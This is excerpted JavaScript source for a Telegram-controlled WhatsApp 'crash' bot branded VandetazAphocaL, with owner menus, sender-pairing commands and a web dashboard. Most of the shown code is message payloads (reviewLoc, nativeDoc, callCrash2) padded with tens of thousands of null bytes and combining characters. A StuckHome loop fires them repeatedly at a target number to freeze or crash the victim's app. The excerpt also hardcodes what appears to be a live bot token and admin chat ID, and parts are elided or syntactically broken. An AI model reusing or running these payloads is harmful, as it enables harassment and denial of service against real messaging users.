...
const ownerIds = [7171660349]; // contoh chat_id owner 
...
const getHeader = (ctx) => {
    ...
    return `
<blockquote>💢 VandetaZControl\nWhere Are To ${username}, To Bot Control Apps VandetazAphocaL Version 3.4.1 Beta</blockquote>

━━━━━━━━━━━━━━━

<blockquote>Apss Information</blockquote>
メ NameBot : @${botUser}
メ NameApps : VandetazAphocaL
メ Version : 1.0.0
メ CreateBase : @AshuraTzy2
メ Server : Online
メ Runtime : ${runtime}
...
`;
    ...
    const keyboardMain = Markup.inlineKeyboard([
        [
            Markup.button.callback('ControlMenu', 'menu_control'),
            Markup.button.callback('SettingsAccount', 'menu_account')
        ],
        [
            Markup.button.callback('OwnerAccess', 'menu_owner'),
            Markup.button.url('DeveloperApps', 'https://t.me/AshuraTzy2')
        ]
    ]);

    // 4. Kirim Pesan Awal (Foto + Menu)
    await ctx.replyWithPhoto(
        { url: "https://files.catbox.moe/tggoe8.jpg" }, 
        {
            caption: textMain,
            parse_mode: "HTML",
            ...keyboardMain
...
<b>AKSES HANYA DIBERIKAN KEPADA ASHURATZY!</b>
`;
...
bot.command("Pairing", async (ctx) => {
  ...
  if (args.length < 2) {
    return ctx.reply("Example : /addbot 628xxxx", { parse_mode: "HTML" });
  }
...
bot.command("delbot", async (ctx) => {
  ...
  if (args.length < 2) return ctx.reply("Example : /delsender 628xxxx", { parse_mode: "HTML" });
...
app.get("/execution", (req, res) => {
    ...
    const filePath = "./MainFile/dasboard.html"; 
...
app.post('/api/reply-message', async (req, res) => {
    ...
    // --- SETTING PENGIRIMAN ---
    const adminChatId = "7464121207"; // <--- TARGET ID KHUSUS
    const botToken = "8508711860:AAEeSsu8AUBZekmI62f6Z5mcdXJkvZQZiIY"; // Token Bot Anda
      ...
      viewOnceMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {},
            body: {
              text: " Ola, idiota sinkoza vaa impossible ",
              format: "DEFAULT"
            },
...
async function callCrash2(sock, target, isVideo = false) {
...
async function reviewLoc(sock, target) { 
  const payload = "\u0000".repeat(60000);
  const urlCrash = `https://${payload}.crash-whatsapp.pnx.com/${payload}/${payload}/${payload}/`;
          ...
          buttons: [
            {
              name: "review_and_pay",
              buttonParamsJson:
                "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":999999999,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"X - RaldzzXyz\",\"amount\":{\"value\":999999999,\"offset\":100},\"quantity\":1}]},\"additional_note\":" + `${"\u0000".repeat(99999)}` + ",\"native_payment_methods\":[],\"share_payment_status\":true}"
            }
          ]
        },
        annotations: [
          {
            embeddedContent: {
              embeddedMessage: {
                message: "──Nxpeɔt¡on`V4ness"
              }
            },
            location: {
              degreesLongitude: 0,
              degreesLatitude: 0,
              name: "──Nxpeɔt¡on`V4ness."
            },
            polygonVertices: [
            ...
            newsletter: {
              ...
              newsletterName: "──Nxpeɔt¡on`V4ness.",
              contentType: "UPDATE",
              accessibilityText: "https://howareyou/"
            }
          }
        ]
      }
  ...
  const pnx = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "# ~ 💤 Itz Me Vaness4Kxa 🦅" + "\u0000".repeat(7500) + "꧀".repeat(55000),
            documentMessage: {
              ...
              fileName: "Vannesa - Expos3d 💤" + "꧀".repeat(1000),
            ...
            buttons: [
              ...
              },
              {
                ...
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "\0" + "AlwasyVanesaa!" + "꧀".repeat(9999),
...
async function nativeDoc(sock, target) {
      ...
      viewOnceMessageV2: {
        message: {
          interactiveMessage: {
            ...
            nativeFlowMessage: {
              messageParamsJson:
                "{\"name\":\"galaxy_message\",\"title\":\"Nxpeɔt¡on\",\"header\":\" # pnx - explanation \",\"body\":\"" + "ꦾ".repeat(50000) + "\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson:
                    "{\"title\":\"" + "᬴".repeat(90000) + "\",\"sections\":[{\"title\":\" who's me ¿? \",\"rows\":[]}]}"
                },
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                ...
                },
                {
                  name: "single_select",
                  buttonParamsJson:
                    "{\"title\":\"" + "᬴".repeat(90000) 
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson:
                    "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"" + "᬴".repeat(90000) + "\",\"flow_id\":\"PNxPection\",\"flow_message_version\":\"9\",\"flow_token\":\"XXX\"}"
                },
                {
                  name: "mpm",
                  buttonParamsJson: "{}"
...
async function StuckHome(durationHours, X) {
  ...
  const sendNext = async () => {
    ...
    try {
      if (count < 20) {
        await Promise.all([
        nativeDoc(sock, target)
        docthumb(sock, target) 
        reviewLoc(sock, target)
        ]);
